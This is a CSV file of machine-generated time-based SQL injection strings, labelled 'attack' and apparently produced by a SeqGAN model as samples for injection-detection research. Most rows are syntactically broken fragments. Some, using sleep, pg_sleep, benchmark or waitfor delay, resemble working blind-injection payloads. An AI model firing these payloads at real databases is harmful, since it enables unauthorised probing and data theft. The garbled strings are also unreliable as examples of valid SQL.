label,payload,family,payload_type,method,run_id,sample_index
attack," select pg_sleep  (  5000000,md5  (  select  s --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1804
attack,"1    )      where '0:0:5'-- -- 6175  =  # or 8514  =    (  5000000,md5  (  select from 8466  =  1132 t  (  2239 6969 from   (  0x544d5a4c  (  0x544d5a4c rmq  )  # 8594  =    (     (     (  select 6969 from pg_sleep  (  2841 or 8514  =  1210  =  # from pg_sleep(  (  5   )    )    )     )    ) and    (     (  select * from(  sleep  (  5   )     )  )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1805
attack,"1' and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    and 'bhswjyq  )  sdbr like 5000000,md5  (  5000000,md5  (  select sleep  (  sleep  (  5   )     )wfz",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1806
attack,"1 or 8514  =  2044 8507  =  benchmark  (  5   )     )   and         (  select * pg_sleep  (  =  6383 1679 8667 from sleep  (  5000000,md5  '%'  =  4683 8466 from pg_sleep  (  0x544d5a4c   (  (  0x694a4745   )    )     )  )    (     5  select (  5  (  select * from   (  select  (  5   )     )    ru",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1807
attack, (  select 6793 from from pg_sleep  (  5   )     #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1808
attack,"1 pg_sleep  (  5000000,md5  --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1809
attack,"select benchmark  (  5000000,md5  (  5  )     )   and    (    (    or 67935  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1810
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'ldi,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1811
attack,"1"" where 8594 from pg_sleep  (  5   )     )   or   (  '%'  )   (  ""zlal""  =    (    (  5   )    (    (  select pg_sleep  (  5   )     )     )   and 6969  =    (     (   6866  =    (   ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1812
attack,select benchmark  (  =   from or from   ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1813
attack,"1"" where '0:0:5' --dmq  )   (  select 6793 emd5  (  0x4c4d6142   )    )    (z'  =  '  )(  select 8594 6793 from pg_sleep  (     (  select  (  (  0x76555642   )     )     )  sddh  )     )  wuvo  =    and   'wyvx' from where 6383 6175  (  5   )  s jq  )  #zc",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1814
attack,"1"" rlike   (  select    (  select 4240 from pg_sleep  (  select  (  5   )8514  =    (  0x544d5a4c   )    (    or 8514  =  (  5000000,md5  sleep  (  5  )g(  'rnzp'  =  '",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1815
attack,"select sleep  (  5   )   -- benchmark  =  benchmark    =  (  5000000,md5  (  '%'  (  5000000,me  )   ,md5  (  select or 6793  =    (     (  select '0:0:5')   -- kfvo """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1816
attack,"1""   )    )    or elt  (  6272  =  6272,sleep  (  5   )    )    and    (    (   ""cvin'  =  ' where 8252  =  =  8252 7021  =  1210,sleep  (  5   )     )   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1817
attack,"1'r or 8594o ""zn",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1818
attack,select pg_sleep  (  0x76555642   -- yfsr #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1819
attack,"1   )    )   and    (    )   or   (  select 6793 from from 3824  =  =   (  select and from   (  select  (  5  )rus e sleep  (  5000000,md5  (  7196  (  (  5   )    )    (    )    n     (  select 6793 from pg_sleepf  (  select 6793 from pg_sleep  (  (  sleep  (  5   )     )  sddo",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1820
attack,"1%""   )    )    rlike sleep  (  5  )   and    (    (   ""%'(v'   )    )     )   waitfor delay 'x r where 7305(  select  (  5   )     )  s elt  (  =  benchmark  (  5   )     )rs fromdyaviqwu like 3824 from pg_sleep  (  5   )    )     )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1821
attack,"select ' or 6793 from or   (  select 4240 from from from   (  select  5000000,md5  (  5   )    )    as xke   'rnzp'  =  1210  =  7196 8667 from   (  sleep  (  5   )     )   and   (     (  select  (  5   )    )     )  srmdk  =  're or 4240  =    (  0x544d5a4c   )    )    and   5874  5   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1822
attack,1 and e 4240    (  select 8594 from from pg_sleep  (  5   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1823
attack,1 or 4240 from pg_sleepusrur yvtfste or 6793  =    (  select  (  5   )    (yaq,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1824
attack,"1'   where sleep  =  (  (  5000000,md5  (  5   )  (  select 8594 from from pg_sleep  (  select from pg_sleep  (  5000000,sleep  (    (  5   )     )   sddkfrom 9649  =  2841 or 4240  =    (  'hrta'  """,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1825
attack,"select 5   )     )   siu where 6175  5000000,md5  (  0x544d5a4clike from where 1568  =  benchmark  (  5   (  select 8594 from pg_sleep  (  7196  (  select * from   (  select  (  5  )   (  5   )    )     )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1826
attack,"1"" yawuyq  <> do  ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1827
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""select where 7196  =  (  =  (  0x544d5a4c   )    (  select sleep  (  5   )    )   #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1828
attack,select sleep  (  5  )    and   (  select 6969  =  6383fzn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1829
attack,select benchmark  (  5   )    )     )   )   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1830
attack,1 or 3824  =  7196  (  5 and 6793  =    (   --,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1831
attack,"select      (  5   )    )     )   el)    (     (  ""uvzc"" e sleep  (  select  (     (  0x694a4745   --",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1832
attack,      )   )    ru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1833
attack,1o and   (vp' where 1241  =  1241 waitfor delay 'k from   (  5   sleep  select 6969 from from   (  select 6793 from from  )   (  select  ( * from   (  5  )  rliq dho  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1834
attack,"1 where 6272  =  (  1210pg_sleep  (  sleep  (    5000000,md5  (  5000000,md5  (  sleep  (  select 8594 from pg_sleep(  5   )    (  0x4c4d6142   )(select * from from   (  1210  =  benchmark  (  0x76555642   (     (  select 6969 from 4240  5   )    )     )   'rnzp'#fsesleep  (  0x76555642   and     (  'hrta' benchmark  5874  =    (     (  select 6969 from or el",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1835
attack,1 where delay 7021  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1836
attack,"1"" pg_sleep  (  '%'  =    (  select * from   (  6272  =  5   )    )     select from and    (  =  select from or from '0:0:5'--5  62722388d  =  benchmark  (  (  5   )    )     )   'hrta' oiqsduc  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1837
attack,"select 4240 benchmark  (  =  benchmark  (  5   and    (    aszq like '0:0:2'=  6272,gc  )   'wyvx'  =    (     (  0x4c4d6142   (  select * from   (  5   (  select  (  (  select and sleep  (  select 4240 from  =  (  1210=  (  =  (_  1210  =  benchmark from or 6969 from   'rnzp'  select not  (  5  )     )rrgu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1838
attack,"1 or 8514d5  (  5000000,mp  =  1210(  (  =  benchmark  (  5   )    )     )   and    (    (         )    )     )   and   'wyvx'  =    (     (     5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1839
attack,"select sleep  (  5   )    )   as xdq   )    and 6793  =    (  ""wucy"" ddmm kmd5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1840
attack,"select    (e6969 from pg_sleep  (  select or 4240 from   (  select  (  (  1210,sleep  (  5   and    (    (  select 6969 from bmd5  (  select 4240 from pg_sleep  0x4c4d6142   )     )  s",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1841
attack,1 9649  (    (  select delay and   (  0x544d5a4c   )     )  ste2044 from pg_sleep  (  sleep  (  5   )    <> 8507  =    (  select  6793 from pg_sleep  (  sleep  (  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1842
attack,"    (  select * from pg_sleep  (  0x544d5a4c,sleep  (  5   and    (    (  select 4240 from   (  select 4240 from from   sleep  (  5000000,md5  (  5   )    g  select from from from   (  sleep  (  5   )    (",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1843
attack,1N,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1844
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'tawke     4240  6383 rldo  )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1845
attack,"select sleep  (  5   )    and    (    (     (      8594 from pg_sleep  (  5r  (  select 8594 from pg_sleep  (  5   )    (  esleep  (ddselect sleep    (  5   )    )     )    (     (  ""uvzc""  =    (  select 6793 from   and do  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1846
attack, 6969 from 6793   =  'rn,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1847
attack,"1'  )   waitfor delay '0:05:5   )     8514  =  1210,sleep  (  5000000,md5  'hrta'  1132 or 8466  =    (  sleep  (  5   )     ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1848
attack,"select 0x544d5a4c   )    and   (    )   )     )   and    (   (  ""wucy"" ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1849
attack,"1' and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and 'zoi'  =  '"" like ""chvike",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1850
attack,1%%'   )    )     )   and sleep  (  5  )   and    (    (     (  '%'  =  'c'  =  'ff,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1851
attack,"* from pg_sleep  (  5000000,md5  (  sddo  =  1915u    )     )   and 8594  =  #uu",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1852
attack,1  )   -- kd  select from from pg_sleep  (  5   and    (  '%'  6866o (   'wyvx'  =    (  select * not  (  5   )     )  gcru,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1853
attack,1'+  (  select 'dk' where 1241  =  1241 waitfor delay 'dminhc,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1854
attack,1 and 8594  =    (  select (  5   )     )     )    #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1855
attack,select benchmark  (  (  5  )   (    (  select 6969 6866  =  'f6969 dmdo5 # f,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1856
attack,1  )   where elt  (  5874  =  (  =  =  7279 or 8514  =  benchmark  (  5   ste 8466  =  6383 7279 7305 from pg_sleep  (  5   )     )  #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1857
attack,"1"" where 6967  =  # 4240 from pg_sleep  (  5   )     and    (    (  ""zlal""  =  6272,1132 and 8594  =    (  select 8594 from pg_sleep  (  1210  benchmark  (    (  5  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1858
attack,1 and and    (    (   5874 'sa' from from pg_sleep  (  5  (    )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1859
attack,"1 or 6793  =    (  select 6969 from from from from   (  5000000,sleep  (  0x694a4745   )    and    (    (    (t  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1860
attack,1 where 3672  =  benchmark  (  58594  =   5874do  1210   6866=  ',time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1861
attack,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'raa' like 'zo)wkjf,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1862
attack,1'   )   #,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1863
attack,1   )    )   -- bet  (  0x544d5a4c   )     )   -- kf  =    (    (  select pg_sleep    select from pg_sleep  (  5   )    )     )r  )  sddpdo  ,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1864
attack,"1"" or 8514  =  benchmark   from pg_sleep  (  5000000,md5  (  sleep  (  (  5   )    )    )    (  select * from   (  select, from pg_sleep  (  5  )   where 2841  5  )  #",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1865
attack,"1'  )   and     (  5   )     )   'fegp'  =  'rruvtvie""   )    )     )   where from   (  select  (  5   )    )     )   6866  =    (     )     )   (     0x76555642   # pdkp",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1866
attack,"1"" and 6969  =    (  select 6969 from pg_sleep  (  5   )    )    and ""ojpe",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1867
attack,"1 where 9008  =  6272waitfor pg_sleep  (  5   )    and    (  select * from   (  selectselect 4240  =  (  5   )     (  select * sleep  (  0x6d457153   )(  select 6793 from pg_sleep  (  0x544d5a4c   (     (  select or 6793  =    (    (  select 4240 from from pg_sleep  (  5   )    (  )  sddomq  select * from   (  select  (      (  5   )     )   and     (  5000000,md5  (  5   )    )     )  )   and    ",time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1868
attack,1 where (  =  6866,time,time,seqgan_improved,seqgan_improved__phase3__time__D__200__V8__sql_aware__len160__gpre160__reward_on__seed88,1869
